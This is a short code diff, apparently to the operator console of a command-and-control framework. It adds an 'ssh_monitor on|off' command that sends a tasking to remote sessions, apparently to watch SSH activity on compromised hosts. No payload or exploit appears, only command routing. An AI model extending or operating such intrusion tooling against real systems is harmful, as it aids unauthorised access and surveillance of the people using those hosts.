@@ -55,6 +55,7 @@ cmds_session = WordCompleter(
         "upload",
         "download",
         "ps",
+        "ssh_monitor",
         "tasking",
         "view",
         "reconfig",
@@ -391,6 +392,8 @@ def session_router(
             handle_view(token, server, session_id, args)
         case "kill":
             handle_kill(token, server, session_id)
+        case "ssh_monitor":
+            handle_ssh_monitor(token, server, session_id, args)
         case "download":
             handle_download(token, server, session_id, args)
         case "upload":
@@ -496,6 +499,12 @@ def handle_download(token: str, server: str, session_id: str, args: list) -> Non
         send_task(token, server, session_id, "download", args[0])
     else:
         print_formatted_text("[*] Expecting command -> download '/full/path/src.txt'")
+
+def handle_ssh_monitor(token: str, server: str, session_id: str, args: list) -> None:
+    if len(args) == 1 and (args[0] == "on" or args[0] == "off"):
+        send_task(token, server, session_id, "ssh_monitor", args[0])
+    else:
+        print_formatted_text("[*] Expecting command -> ssh_monitor on|off")
 
 
 def handle_upload(token: str, server: str, session_id: str, args: list) -> None:
